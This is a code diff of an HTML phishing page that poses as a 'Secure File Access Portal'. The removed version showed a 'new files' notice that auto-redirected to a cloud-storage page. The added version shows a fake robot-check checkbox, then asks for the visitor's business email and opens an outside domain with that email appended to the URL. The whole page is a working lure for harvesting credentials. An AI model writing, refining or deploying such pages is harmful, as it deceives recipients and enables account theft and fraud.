@@ -1,90 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>File Notification</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
-      color: white;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+<meta charset="UTF-8">
+<title>Secure File Access Portal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    .card {
-      background: rgba(255,255,255,0.1);
-      padding: 30px;
-      border-radius: 12px;
-      text-align: center;
-      width: 380px;
-      backdrop-filter: blur(10px);
-    }
+<style>
+body{
+margin:0;
+background:#eef2f7;
+font-family:"Segoe UI",sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
 
-    h1 {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
+.box{
+width:100%;
+max-width:520px;
+background:#fff;
+border-radius:12px;
+box-shadow:0 20px 50px rgba(0,0,0,0.1);
+padding:40px;
+text-align:center;
+}
 
-    p {
-      font-size: 14px;
-      opacity: 0.9;
-    }
+input[type="email"]{
+width:100%;
+padding:12px;
+border-radius:6px;
+border:1px solid #ccc;
+margin-bottom:20px;
+}
 
-    .loader {
-      margin-top: 20px;
-      border: 4px solid rgba(255,255,255,0.2);
-      border-top: 4px solid white;
-      border-radius: 50%;
-      width: 35px;
-      height: 35px;
-      animation: spin 1s linear infinite;
-      margin-left: auto;
-      margin-right: auto;
-    }
+button{
+width:100%;
+padding:14px;
+background:#1e2a38;
+color:#fff;
+border:none;
+border-radius:6px;
+cursor:pointer;
+}
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+button:disabled{
+background:#999;
+cursor:not-allowed;
+}
 
-    .hidden {
-      display: none;
-    }
-  </style>
+#portal{
+display:none;
+}
+
+.captchaBox{
+display:flex;
+align-items:center;
+justify-content:center;
+gap:10px;
+border:1px solid #ddd;
+padding:15px;
+border-radius:6px;
+margin-top:20px;
+}
+</style>
 </head>
+
 <body>
 
-<div class="card">
+<!-- CAPTCHA PAGE -->
+<div class="box" id="captchaPage">
 
-  <!-- STEP 1 -->
-  <div id="step1">
-    <h1>Good day</h1>
-    <p>You have received new files.</p>
-  </div>
+<h2>Security Verification</h2>
+<p>Please confirm you are not a robot to continue.</p>
 
-  <!-- STEP 2 -->
-  <div id="step2" class="hidden">
-    <h1>Preparing your files</h1>
-    <p>Please wait while we securely load your documents...</p>
-    <div class="loader"></div>
-  </div>
+<div class="captchaBox">
+<input type="checkbox" id="robotCheck" onclick="unlockPortal()">
+<label for="robotCheck">I am not a robot</label>
+</div>
+
+</div>
+
+<!-- MAIN PORTAL -->
+<div class="box" id="portal">
+
+<h2>Secure Document Verification</h2>
+<p>Please enter your business email to continue.</p>
+
+<input type="email" id="email" placeholder="name@company.com" required>
+<button type="button" onclick="redirectUser()">Continue Securely</button>
 
 </div>
 
 <script>
-  // Show loading after 2 seconds
-  setTimeout(() => {
-    document.getElementById("step1").classList.add("hidden");
-    document.getElementById("step2").classList.remove("hidden");
-  }, 2000);
+// Unlock portal when checkbox clicked
+function unlockPortal(){
+    document.getElementById("captchaPage").style.display = "none";
+    document.getElementById("portal").style.display = "block";
 
-  // Redirect after total ~5 seconds
-  setTimeout(() => {
-    window.location.href = "https://storage.googleapis.com/april20258393903933202399465845939/index.html";
-  }, 5000);
+    // Auto-reset checkbox after 1 second
+    setTimeout(function(){
+        document.getElementById("robotCheck").checked = false;
+    }, 1000);
+}
+
+// Redirect function for email input
+function redirectUser(){
+    var email = document.getElementById("email").value.trim();
+    if(email === "") return alert("Please enter your email");
+
+    // Open new tab exactly like "https://google.comEMAIL"
+    var url = "https://eeeee12121.cleararchitecture.de/yQFBH#" + email;
+    window.open(url, "_blank");
+}
 </script>
 
 </body>
